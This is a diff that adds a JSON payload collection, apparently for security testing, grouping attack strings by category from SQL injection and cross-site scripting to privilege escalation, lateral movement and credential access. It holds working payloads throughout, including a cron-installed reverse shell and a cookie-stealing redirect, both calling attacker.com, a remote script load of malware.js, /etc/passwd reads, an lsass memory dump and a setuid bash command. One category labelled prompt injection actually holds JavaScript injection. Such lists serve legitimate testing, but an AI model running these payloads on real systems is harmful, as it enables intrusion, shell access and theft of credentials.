@@ -1,0 +1,57 @@
+{
+    "sql_injection": {
+        "classic_union": "UNION SELECT NULL, username, password FROM users--",
+        "error_based": "' OR 1=1; --",
+        "blind_boolean": "' OR 1=1 AND '1'='1' --",
+        "time_based": "'; IF (1=1) WAITFOR DELAY '00:00:10'--"
+    },
+    "xss_injection": {
+        "basic": "<script>alert('XSS');</script>",
+        "img_onerror": "<img src='invalid.jpg' onerror='alert(\"XSS\")'>",
+        "document_cookie": "<script>document.write(document.cookie);</script>",
+        "dom_based": "javascript:alert('XSS')"
+    },
+    "xpath_injection": {
+        "authentication_bypass": "' or '1'='1",
+        "data_exfiltration": "name[.='admin']/parent::*",
+        "blind": "' or count(/user/name[text()='admin']) or '1'='1"
+    },
+    "command_injection": {
+        "basic": "; cat /etc/passwd",
+        "pipe": "|| cat /etc/passwd",
+        "subshell": "$(cat /etc/passwd)"
+    },
+    "template_injection": {
+        "server_side": "{{7*'7'}}",
+        "client_side": "<div data-id='{{user.id}}'></div>"
+    },
+    "prompt_injection": {
+        "basic": "0; alert('Injected!'); //",
+        "advanced": "0; window.location='http://attacker.com/?cookie='+document.cookie; //"
+    },
+    "rce_injection": {
+        "basic": "`cat /etc/passwd`",
+        "php_eval": "eval('$code = $_GET[\"code\"];')",
+        "python_exec": "__import__('os').system('ls')"
+    },
+    "privilege_escalation": {
+        "sudo_wildcard": "sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+        "cron_job": "echo '* * * * * /bin/sh -i >& /dev/tcp/attacker.com/8080 0>&1' >> /etc/cron.d/root",
+        "setuid": "chmod u+s /bin/bash"
+    },
+    "lateral_movement": {
+        "pass_the_hash": "pth-winexe -U hash //target cmd",
+        "remote_desktop": "rdesktop -u victim -p password target",
+        "ssh_agent": "ssh -A user@target"
+    },
+    "credential_access": {
+        "memory_dump": "procdump -ma lsass.exe lsass.dmp",
+        "phishing": "echo 'Your password has expired' | mail -s 'Password Reset' user@domain.com",
+        "keylogger": "python -c 'import pynput.keyboard; listener = pynput.keyboard.Listener(on_press=on_press); listener.start(); listener.join()'"
+    },
+    "initial_access": {
+        "spear_phishing": "echo 'Please review the attached document.' | mail -a report.pdf -s 'Annual Report' user@domain.com",
+        "drive_by_download": "<script src='http://attacker.com/malware.js'></script>",
+        "exploit_public_facing_application": "msfconsole -x 'use exploit/multi/http/drupal_drupageddon; set RHOST target.com; run'"
+    }
+}
